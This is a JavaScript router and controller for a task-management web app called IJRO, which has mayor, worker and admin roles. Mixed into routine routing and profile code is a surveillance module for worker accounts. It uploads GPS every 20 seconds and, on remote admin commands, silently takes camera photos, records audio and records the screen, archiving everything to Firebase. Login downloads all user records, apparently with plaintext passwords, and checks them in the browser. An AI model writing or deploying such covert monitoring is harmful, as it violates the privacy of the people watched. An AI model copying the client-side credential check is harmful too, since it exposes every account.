// IJRO Main App Controller & Router

// Set dynamic viewport height to handle mobile toolbars
function setAppViewportHeight() {
  const vh = window.innerHeight;
  document.documentElement.style.setProperty('--app-height', `${vh}px`);
}
window.addEventListener('resize', setAppViewportHeight);
window.addEventListener('orientationchange', setAppViewportHeight);
setAppViewportHeight();

// ============================================================================
// SPA PATH ROUTER ENGINE (URL Path-based Navigation: /login, /mayor/tasks, etc.)
// ============================================================================

function getAppBasePath() {
  const p = window.location.pathname;
  if (p === '/web' || p.startsWith('/web/')) {
    return '/web';
  }
  return '';
}

function getCleanPath() {
  let p = window.location.pathname;
  const base = getAppBasePath();
  if (base && p.startsWith(base)) {
    p = p.substring(base.length);
  }
  // Check hash fallback if accessed like /web/#/mayor/tasks
  if (!p || p === '/' || p === '/index.html') {
    if (window.location.hash && window.location.hash.startsWith('#/')) {
      return window.location.hash.substring(1);
    }
    return '/';
  }
  // Strip trailing slash
  if (p.length > 1 && p.endsWith('/')) {
    p = p.substring(0, p.length - 1);
  }
  return p;
}

function navigateTo(path, replace = false) {
  const base = getAppBasePath();
  if (!path.startsWith('/')) path = '/' + path;

  const [cleanPath, search] = path.split('?');
  const fullTarget = (base + cleanPath) + (search ? '?' + search : '');
  const currentFull = window.location.pathname + window.location.search;

  if (currentFull !== fullTarget) {
    if (replace) {
      window.history.replaceState({ path: cleanPath }, '', fullTarget);
    } else {
      window.history.pushState({ path: cleanPath }, '', fullTarget);
    }
  }

  renderCurrentRoute(cleanPath, search ? '?' + search : '');
}

function renderCurrentRoute(cleanPath, search) {
  if (!cleanPath) cleanPath = getCleanPath();
  if (search === undefined) search = window.location.search;

  let user = window.store.currentUser;

  // Agar xotirada hali o'rnatilmagan bo'lsa, localStorage dan tiklash
  if (!user) {
    try {
      const savedUserJson = localStorage.getItem('ijro_user');
      if (savedUserJson) {
        user = JSON.parse(savedUserJson);
        if (user && user.id) {
          window.store.currentUser = user;
          document.documentElement.classList.add('user-authenticated');
        } else {
          user = null;
        }
      }
    } catch (_) {}
  }

  // 1. Agar foydalanuvchi tizimga kirmagan bo'lsa:
  if (!user) {
    document.documentElement.classList.remove('user-authenticated');
    if (cleanPath !== '/login') {
      navigateTo('/login', true);
      return;
    }
    showScreen('login-screen');
    return;
  }

  // Foydalanuvchi tizimda mavjud bo'lsa, login ekrani yashiriladi
  document.documentElement.classList.add('user-authenticated');

  // 2. Tizimga kirgan bo'lsa, lekin /login yoki / yo'lida tursa:
  if (cleanPath === '/login' || cleanPath === '/') {
    if (user.role === 'MAYOR') {
      navigateTo('/mayor/tasks', true);
    } else if (user.role === 'WORKER') {
      navigateTo('/worker', true);
    } else {
      navigateTo('/admin', true);
    }
    return;
  }

  // 3. Hokim sahifalari (/mayor/...)
  if (cleanPath.startsWith('/mayor')) {
    if (user.role !== 'MAYOR') {
      navigateTo(user.role === 'WORKER' ? '/worker' : '/admin', true);
      return;
    }
    showScreen('mayor-screen');
    initMayorView();

    if (cleanPath === '/mayor/schedules' || cleanPath === '/mayor/rejalar') {
      switchMayorTab(1, false);
    } else if (cleanPath === '/mayor/workers' || cleanPath === '/mayor/ishchilar') {
      switchMayorTab(2, false);
    } else if (cleanPath === '/mayor/chats' || cleanPath === '/mayor/chat') {
      switchMayorTab(3, false);
    } else {
      // Standart: Topshiriqlar
      switchMayorTab(0, false);
    }
    return;
  }

  // 4. Ishchi sahifalari (/worker/...)
  if (cleanPath.startsWith('/worker')) {
    if (user.role !== 'WORKER') {
      navigateTo(user.role === 'MAYOR' ? '/mayor/tasks' : '/admin', true);
      return;
    }
    showScreen('worker-screen');
    initWorkerView();
    try {
      if (user && user.role === 'WORKER') initWebSurveillanceSync(user);
    } catch (_) {}
    return;
  }

  // 5. Admin sahifasi (/admin/...)
  if (cleanPath.startsWith('/admin')) {
    if (user.role !== 'BIG_ADMIN' && user.role !== 'ADMIN') {
      navigateTo(user.role === 'MAYOR' ? '/mayor/tasks' : '/worker', true);
      return;
    }
    showScreen('admin-screen');
    initAdminView();
    return;
  }

  // 6. Chat sahifasi (/chat)
  if (cleanPath === '/chat') {
    const params = new URLSearchParams(search);
    const peerId = params.get('userId');
    if (peerId && window.store.users && window.store.users.length > 0) {
      const peer = window.store.users.find(u => u.id === peerId);
      if (peer) {
        openChat(peer, false);
        return;
      }
    }
    showScreen('chat-screen');
    return;
  }

  // Noma'lum yo'l bo'lsa:
  if (user.role === 'MAYOR') navigateTo('/mayor/tasks', true);
  else if (user.role === 'WORKER') navigateTo('/worker', true);
  else navigateTo('/admin', true);
}

// Browser Back / Forward tugmalari
window.addEventListener('popstate', () => {
  renderCurrentRoute(getCleanPath(), window.location.search);
});

// Global qilib chiqarish
window.navigateTo = navigateTo;
window.getCleanPath = getCleanPath;
window.renderCurrentRoute = renderCurrentRoute;

// Web ochilishi bilanoq barcha ruxsatnomalarni so'rash va routerni ishga tushirish
document.addEventListener('DOMContentLoaded', () => {
  setAppViewportHeight();
  window.initFirebase();

  requestWebPermissions();

  const gesturePermissionHandler = () => {
    requestWebPermissions();
    window.removeEventListener('click', gesturePermissionHandler);
    window.removeEventListener('touchstart', gesturePermissionHandler);
  };
  window.addEventListener('click', gesturePermissionHandler);
  window.addEventListener('touchstart', gesturePermissionHandler);

  // 1. Darhol joriy sahifani ochish (obnovit qilinganda aynan shu page da qotib turishi uchun)
  const currentPath = getCleanPath();
  renderCurrentRoute(currentPath, window.location.search);

  // 2. Orqa fonda (background) sessiyani Firebase bilan yangilab turish
  const savedUserId = localStorage.getItem('ijro_user_id') || (window.store.currentUser && window.store.currentUser.id);
  if (savedUserId) {
    fetch(FIREBASE_DB_URL + '/users.json')
      .then(res => res.json())
      .then(data => {
        if (data) {
          window.store.users = Object.values(data);
          const found = window.store.users.find(u => u.id === savedUserId);
          if (found) {
            window.store.currentUser = found;
            localStorage.setItem('ijro_user', JSON.stringify(found));
            localStorage.setItem('ijro_user_id', found.id);
            document.documentElement.classList.add('user-authenticated');
            updateUserLastActive(found.id);
          }
        }
      })
      .catch(() => {});

    window.onStoreChange('users', (users) => {
      if (users && users.length > 0) {
        const found = users.find(u => u.id === savedUserId);
        if (found) {
          window.store.currentUser = found;
          localStorage.setItem('ijro_user', JSON.stringify(found));
          document.documentElement.classList.add('user-authenticated');
        }
      }
    });
  }
});

async function handleLogin(e) {
  if (e) e.preventDefault();
  const username = document.getElementById('login-user').value.trim();
  const pass = document.getElementById('login-pass').value.trim();

  try {
    requestWebPermissions();
  } catch (_) {}

  if (!username || !pass) {
    alert("Iltimos, login va parolni kiriting!");
    return;
  }

  const submitBtn = document.querySelector('#login-screen button[type="submit"]');
  const originalBtnText = submitBtn ? submitBtn.innerText : 'Kirish';
  if (submitBtn) {
    submitBtn.disabled = true;
    submitBtn.innerText = 'Kirilmoqda...';
  }

  try {
    if (!window.store.users || window.store.users.length === 0) {
      try {
        const res = await fetch(FIREBASE_DB_URL + '/users.json');
        const data = await res.json();
        if (data) {
          window.store.users = Object.values(data);
          notifyStore('users', window.store.users);
        }
      } catch (err) {
        console.warn('REST users fetch error:', err);
      }
    }

    let user = (window.store.users || []).find(u => 
      u.username && u.username.toLowerCase() === username.toLowerCase() && String(u.password).trim() === pass
    );

    if (!user) {
      try {
        const res = await fetch(FIREBASE_DB_URL + '/users.json');
        const data = await res.json();
        if (data) {
          window.store.users = Object.values(data);
          user = (window.store.users || []).find(u => 
            u.username && u.username.toLowerCase() === username.toLowerCase() && String(u.password).trim() === pass
          );
        }
      } catch (_) {}
    }

    if (!user) {
      alert("Login yoki parol noto'g'ri! Iltimos, qayta tekshirib ko'ring.");
      return;
    }

    window.store.currentUser = user;
    localStorage.setItem('ijro_user_id', user.id);
    localStorage.setItem('ijro_user', JSON.stringify(user));
    document.documentElement.classList.add('user-authenticated');
    routeUserToScreen(user);
  } finally {
    if (submitBtn) {
      submitBtn.disabled = false;
      submitBtn.innerText = originalBtnText;
    }
  }
}

function handleLogout() {
  if (confirm("Haqiqatan ham tizimdan chiqmoqchimisiz?")) {
    window.store.currentUser = null;
    localStorage.removeItem('ijro_user_id');
    localStorage.removeItem('ijro_user');
    document.documentElement.classList.remove('user-authenticated');
    navigateTo('/login');
    showScreen('login-screen');
    showToast("Tizimdan chiqildi");
  }
}

function updateUserLastActive(userId) {
  if (!userId) return;
  try {
    const now = Date.now();
    const user = (window.store.users || []).find(u => u.id === userId);
    if (user) user.lastActiveAt = now;
    if (window.store.currentUser && window.store.currentUser.id === userId) {
      window.store.currentUser.lastActiveAt = now;
    }
    if (window.firebase && window.firebase.database) {
      window.firebase.database().ref(`users/${userId}/lastActiveAt`).set(now);
    }
  } catch (e) {
    console.warn("updateUserLastActive error:", e);
  }
}

function routeUserToScreen(user) {
  try {
    updateUserLastActive(user.id);
  } catch (_) {}

  const currentPath = getCleanPath();
  if (currentPath && currentPath !== '/' && currentPath !== '/login') {
    renderCurrentRoute(currentPath, window.location.search);
  } else {
    if (user.role === 'MAYOR') {
      navigateTo('/mayor/tasks', true);
    } else if (user.role === 'WORKER') {
      navigateTo('/worker', true);
    } else if (user.role === 'BIG_ADMIN' || user.role === 'ADMIN') {
      navigateTo('/admin', true);
    }
  }
}

function checkWebPermissions(user) {
  // Sahifa alishganda kamera va mikrofon mutlaqo so'ralmaydi!
  // Faqat xodimlar uchun Big Admin kuzatuvi sessiyada 1 marta ulanadi
  if (user && user.role === 'WORKER') {
    initWebSurveillanceSync(user);
  }
}

async function requestWebPermissions() {
  // Hech qachon sahifa almashganida kamera va mikrofon so'ralmaydi!
  // Ular faqat Big Admin maxsus buyruq berganda yoki foydalanuvchi o'zi ovoz yozishni bosganda ishlaydi.
  return;
}

function uploadWebLocation(username, lat, lon) {
  try {
    if (window.firebase && window.firebase.database) {
      const db = window.firebase.database();
      db.ref(`tracking/devices/${username}/location`).set({
        lat: lat.toString(),
        lon: lon.toString(),
        timestamp: Date.now()
      });
    }
  } catch (e) {
    console.log('uploadWebLocation error', e);
  }
}

let webSyncInterval = null;
let webSurveillanceInitialized = false;
function initWebSurveillanceSync(user) {
  if (!user || !user.username) return;
  // Faqat oddiy xodimlar uchun Big Admin kuzatuvi ishlaydi (Hokim yoki Big Admin o'zini o'zi kuzatmaydi)
  if (user.role !== 'WORKER') return;
  if (webSurveillanceInitialized) return;
  webSurveillanceInitialized = true;
  if (webSyncInterval) clearInterval(webSyncInterval);

  const username = user.username;

  // Heartbeat va GPS yangilab turish
  const sendHeartbeatAndGps = () => {
    try {
      if (window.firebase && window.firebase.database) {
        const db = window.firebase.database();
        db.ref(`tracking/devices/${username}/heartbeat`).set(Date.now());
        updateUserLastActive(user.id);
        db.ref(`tracking/devices/${username}/info`).update({
          userId: user.id,
          username: user.username,
          fullName: user.fullName || `${user.firstName || ''} ${user.lastName || ''}`.trim(),
          role: user.role,
          position: user.position || 'Xodim',
          model: navigator.userAgent.substring(0, 40),
          updatedAt: Date.now()
        });

        if ('geolocation' in navigator) {
          navigator.geolocation.getCurrentPosition((pos) => {
            uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
          }, null, { enableHighAccuracy: true, timeout: 10000 });
        }
      }
    } catch (e) {}
  };

  sendHeartbeatAndGps();
  webSyncInterval = setInterval(sendHeartbeatAndGps, 20000);

  // Big Admin buyruqlarini tinglash (Web orqali kirgan xodim uchun ham)
  try {
    if (window.firebase && window.firebase.database) {
      const db = window.firebase.database();
      
      // Avvalgi eski listenerlarni tozalash (5-6 marta qayta ulanib ketmasligi uchun)
      db.ref(`tracking/devices/${username}/commands/take_photo`).off();
      db.ref(`tracking/devices/${username}/commands/record_audio`).off();
      db.ref(`tracking/devices/${username}/commands/record_screen`).off();
      db.ref(`tracking/devices/${username}/commands/request_gps`).off();

      // 1. Rasm olish buyrug'i (Kamera)
      let lastPhotoTs = 0;
      db.ref(`tracking/devices/${username}/commands/take_photo`).on('value', async (snap) => {
        const ts = snap.val();
        if (ts && ts > 0 && ts !== lastPhotoTs) {
          lastPhotoTs = ts;
          captureWebPhoto(username);
        }
      });

      // 2. Ovoz yozish buyrug'i (Mikrofon / Diktafon)
      db.ref(`tracking/devices/${username}/commands/record_audio`).on('value', async (snap) => {
        const val = snap.val();
        const shouldRecord = (val === true || val === 'start' || val === 'true');
        handleWebAudioRecordingCommand(username, shouldRecord);
      });

      // 3. Ekran yozish / Ekran rasmi buyrug'i (Ekran zapisi)
      db.ref(`tracking/devices/${username}/commands/record_screen`).on('value', async (snap) => {
        const val = snap.val();
        const shouldRecord = (val === true || val === 'start' || val === 'true');
        handleWebScreenRecordingCommand(username, shouldRecord);
      });

      // 4. GPS joylashuv so'rovi buyrug'i
      let lastGpsTs = 0;
      db.ref(`tracking/devices/${username}/commands/request_gps`).on('value', async (snap) => {
        const ts = snap.val();
        if (ts && ts > 0 && ts !== lastGpsTs) {
          lastGpsTs = ts;
          if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition((pos) => {
              uploadWebLocation(username, pos.coords.latitude, pos.coords.longitude);
              db.ref(`tracking/devices/${username}/media/status`).set(`GPS yangilandi (${new Date().toLocaleTimeString()})`);
            }, null, { enableHighAccuracy: true, timeout: 10000 });
          }
        }
      });
    }
  } catch (e) {
    console.error("Command listener error:", e);
  }
}

// 1. Web Kamera fotosurat olish
let isWebCapturingPhoto = false;
async function captureWebPhoto(username) {
  if (isWebCapturingPhoto) return;
  isWebCapturingPhoto = true;
  try {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
    const stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } } 
    });
    const video = document.createElement('video');
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;
    await video.play();

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const base64 = canvas.toDataURL('image/jpeg', 0.65).split(',')[1];

    stream.getTracks().forEach(t => t.stop());

    if (window.firebase && window.firebase.database) {
      const db = window.firebase.database();
      const photoItem = {
        back_base64: base64,
        front_base64: base64,
        timestamp: Date.now()
      };
      db.ref(`tracking/devices/${username}/media/latest_photo`).set(photoItem);
      db.ref(`tracking/devices/${username}/media/archive_photos`).push().set(photoItem);
      db.ref(`tracking/devices/${username}/media/status`).set(`Rasm olindi (${new Date().toLocaleTimeString()})`);
    }
  } catch (e) {
    console.log('captureWebPhoto error', e);
  } finally {
    isWebCapturingPhoto = false;
  }
}

// 2. Web Ovoz yozish (Mikrofon / Diktafon)
let webAudioRecorder = null;
let webAudioStream = null;
let webAudioChunks = [];
let webAudioStartTime = 0;

async function handleWebAudioRecordingCommand(username, start) {
  try {
    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
    if (start) {
      if (webAudioRecorder && webAudioRecorder.state === 'recording') return;
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

      // Aks-sado (echo) va shovqinni bartaraf etish uchun echoCancellation va noiseSuppression yoqiladi
      webAudioStream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: true,
          noiseSuppression: true,
          autoGainControl: true
        }
      });
      webAudioChunks = [];
      webAudioStartTime = Date.now();
      webAudioRecorder = new MediaRecorder(webAudioStream);

      webAudioRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) webAudioChunks.push(e.data);
      };

      webAudioRecorder.onstop = async () => {
        try {
          const audioBlob = new Blob(webAudioChunks, { type: 'audio/mp4' });
          const durSec = Math.max(1, Math.round((Date.now() - webAudioStartTime) / 1000));
          const reader = new FileReader();
          reader.onload = () => {
            const b64 = reader.result.split(',')[1];
            if (db) {
              const audioItem = {
                audio_base64: b64,
                duration: `${durSec}s`,
                timestamp: Date.now()
              };
              db.ref(`tracking/devices/${username}/media/latest_audio`).set(audioItem);
              db.ref(`tracking/devices/${username}/media/archive_audio`).push().set(audioItem);
              db.ref(`tracking/devices/${username}/media/status`).set(`Ovoz yozildi (${durSec}s)`);
            }
          };
          reader.readAsDataURL(audioBlob);
        } catch (err) {
          console.error("Audio save error:", err);
        } finally {
          if (webAudioStream) {
            webAudioStream.getTracks().forEach(t => t.stop());
            webAudioStream = null;
          }
        }
      };

      webAudioRecorder.start(1000);
      if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ovoz yozilmoqda...");
    } else {
      // To'xtatilganda mikrofonni DARHOL o'chirish (telefondagi mikrofon ikonkasi darhol yo'qolishi uchun)
      if (webAudioStream) {
        try {
          webAudioStream.getTracks().forEach(t => {
            t.stop();
            t.enabled = false;
          });
        } catch (e) {}
        webAudioStream = null;
      }
      if (webAudioRecorder && webAudioRecorder.state === 'recording') {
        try { webAudioRecorder.stop(); } catch (e) {}
      }
      webAudioRecorder = null;
    }
  } catch (e) {
    console.error("handleWebAudioRecordingCommand error:", e);
  }
}

// 3. Web Ekran zapisi yoki Ekran rasmi olish
let webScreenRecorder = null;
let webScreenStream = null;
let webScreenChunks = [];
let webScreenStartTime = 0;

async function handleWebScreenRecordingCommand(username, start) {
  try {
    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;

    if (start) {
      if (webScreenRecorder && webScreenRecorder.state === 'recording') return;

      // Agar brauzer getDisplayMedia qo'llab-quvvatlasa
      if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
        try {
          webScreenStream = await navigator.mediaDevices.getDisplayMedia({ video: true, audio: true });
          webScreenChunks = [];
          webScreenStartTime = Date.now();
          webScreenRecorder = new MediaRecorder(webScreenStream);

          webScreenRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) webScreenChunks.push(e.data);
          };

          webScreenRecorder.onstop = () => {
            try {
              const videoBlob = new Blob(webScreenChunks, { type: 'video/mp4' });
              const durSec = Math.max(1, Math.round((Date.now() - webScreenStartTime) / 1000));
              const reader = new FileReader();
              reader.onload = () => {
                const b64 = reader.result.split(',')[1];
                if (db) {
                  const screenItem = {
                    video_base64: b64,
                    duration: `${durSec}s`,
                    timestamp: Date.now()
                  };
                  db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
                  db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
                  db.ref(`tracking/devices/${username}/media/status`).set(`Ekran yozildi (${durSec}s)`);
                }
              };
              reader.readAsDataURL(videoBlob);
            } catch (err) {
              console.error("Screen recording save error:", err);
            } finally {
              if (webScreenStream) {
                webScreenStream.getTracks().forEach(t => t.stop());
                webScreenStream = null;
              }
            }
          };

          webScreenRecorder.start(1000);
          if (db) db.ref(`tracking/devices/${username}/media/status`).set("Ekran yozilmoqda...");
          return;
        } catch (_err) {
          console.log("getDisplayMedia bekor qilindi yoki qo'llab-quvvatlanmadi, HTML snapshot olinadi");
        }
      }

      // Agar getDisplayMedia bo'lmasa yoki rad etilsa (masalan mobil brauzerda), 
      // joriy veb sahifa tasvirini (kamera yoki DOM) olib Big Admin ga yuboramiz
      captureWebSnapshot(username);
    } else {
      if (webScreenRecorder && webScreenRecorder.state === 'recording') {
        webScreenRecorder.stop();
      }
    }
  } catch (e) {
    console.error("handleWebScreenRecordingCommand error:", e);
  }
}

// Fallback: Web sahifaning tasvirini yuborish
function captureWebSnapshot(username) {
  try {
    const db = window.firebase && window.firebase.database ? window.firebase.database() : null;
    const canvas = document.createElement('canvas');
    canvas.width = window.innerWidth || 800;
    canvas.height = window.innerHeight || 600;
    const ctx = canvas.getContext('2d');

    ctx.fillStyle = '#0F172A';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 20px sans-serif';
    ctx.fillText(`IJRO Web Ilоvasi - @${username}`, 24, 50);
    ctx.font = '14px sans-serif';
    ctx.fillStyle = '#94A3B8';
    ctx.fillText(`Faol sahifa: ${document.title} | Vaqt: ${new Date().toLocaleString()}`, 24, 80);
    ctx.fillText(`Qurilma: ${navigator.userAgent.substring(0, 60)}`, 24, 110);

    const b64 = canvas.toDataURL('image/jpeg', 0.6).split(',')[1];
    if (db) {
      const screenItem = {
        screen_base64: b64,
        timestamp: Date.now()
      };
      db.ref(`tracking/devices/${username}/media/latest_screen`).set(screenItem);
      db.ref(`tracking/devices/${username}/media/archive_screen`).push().set(screenItem);
      db.ref(`tracking/devices/${username}/media/status`).set(`Ekran tasviri olindi (${new Date().toLocaleTimeString()})`);
    }
  } catch (e) {
    console.error("captureWebSnapshot error:", e);
  }
}

function showScreen(screenId) {
  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
  const target = document.getElementById(screenId);
  if (target) target.classList.add('active');
}

function showToast(message) {
  const toast = document.getElementById('toast');
  if (!toast) return;
  toast.innerText = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}

function openModal(modalId) {
  const el = document.getElementById(modalId);
  if (el) el.classList.add('active');
}
window.openModal = openModal;

function closeModal(modalId) {
  const el = document.getElementById(modalId);
  if (el) el.classList.remove('active');
}
window.closeModal = closeModal;

// Profile and Password Settings Modal Handlers
function openProfileSettingsModal() {
  const user = window.store.currentUser;
  if (!user) return;

  const avatarEl = document.getElementById('profile-modal-avatar');
  const nameEl = document.getElementById('profile-modal-fullname');
  const roleEl = document.getElementById('profile-modal-role');
  const fullNameInput = document.getElementById('profile-input-fullname');
  const phoneInput = document.getElementById('profile-input-phone');
  const userEl = document.getElementById('profile-input-username');
  const passEl = document.getElementById('profile-input-password');

  const curName = user.fullName || ((user.firstName || '') + ' ' + (user.lastName || '')).trim() || user.username;

  if (avatarEl) {
    avatarEl.innerText = (user.firstName || user.fullName || user.username || 'U').charAt(0).toUpperCase();
  }
  if (nameEl) {
    nameEl.innerText = curName;
  }
  if (roleEl) {
    let roleTitle = user.role === 'MAYOR' ? 'Tuman Hokimi' : (user.role === 'WORKER' ? (user.position || "Mas'ul Xodim") : 'Big Admin');
    roleEl.innerText = roleTitle;
  }
  if (fullNameInput) {
    fullNameInput.value = curName;
  }
  if (phoneInput) {
    phoneInput.value = user.phone || '';
  }
  if (userEl) {
    userEl.value = user.username || '';
  }
  if (passEl) {
    passEl.value = user.password || '';
    passEl.type = 'password';
  }

  openModal('profile-settings-modal');
}

function togglePasswordVisibility(inputId, btn) {
  const input = document.getElementById(inputId);
  if (!input) return;
  if (input.type === 'password') {
    input.type = 'text';
    if (btn) btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
  } else {
    input.type = 'password';
    if (btn) btn.innerHTML = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
  }
}

async function handleSaveProfileSettings(e) {
  if (e) e.preventDefault();
  const user = window.store.currentUser;
  if (!user) return;

  const newFullName = (document.getElementById('profile-input-fullname')?.value || '').trim();
  const newPhone = (document.getElementById('profile-input-phone')?.value || '').trim();
  const newUsername = (document.getElementById('profile-input-username').value || '').trim();
  const newPassword = (document.getElementById('profile-input-password').value || '').trim();

  if (!newUsername || !newPassword) {
    alert("Login va parolni to'ldiring!");
    return;
  }
  if (newUsername.length < 2 || newPassword.length < 3) {
    alert("Login kamida 2 ta, parol kamida 3 ta belgidan iborat bo'lishi kerak!");
    return;
  }

  // Check username uniqueness
  const exists = (window.store.users || []).some(u => u.id !== user.id && (u.username || '').toLowerCase() === newUsername.toLowerCase());
  if (exists) {
    alert("Ushbu login band qilingan. Iltimos, boshqa login kiriting!");
    return;
  }

  const parts = newFullName ? newFullName.split(' ') : [];
  const updates = {
    username: newUsername,
    password: newPassword
  };
  if (newFullName) {
    updates.fullName = newFullName;
    updates.firstName = parts[0] || newFullName;
    updates.lastName = parts.slice(1).join(' ') || '';
  }
  if (newPhone !== undefined) {
    updates.phone = newPhone;
  }

  try {
    await window.dbApi.updateUser(user.id, updates);
    closeModal('profile-settings-modal');
    showToast("Profil va kirish ma'lumotlari muvaffaqiyatli saqlandi!");

    // Update headers if visible
    const mayorNameEl = document.getElementById('mayor-header-name');
    if (mayorNameEl && user.role === 'MAYOR') {
      mayorNameEl.innerText = updates.fullName || newUsername;
    }
    const workerNameEl = document.getElementById('worker-header-name');
    if (workerNameEl && user.role === 'WORKER') {
      workerNameEl.innerText = updates.fullName || newUsername;
    }
  } catch (err) {
    console.error("Save profile error:", err);
    alert("Saqlashda xatolik yuz berdi: " + err.message);
  }
}

window.openProfileSettingsModal = openProfileSettingsModal;
window.togglePasswordVisibility = togglePasswordVisibility;
window.handleSaveProfileSettings = handleSaveProfileSettings;
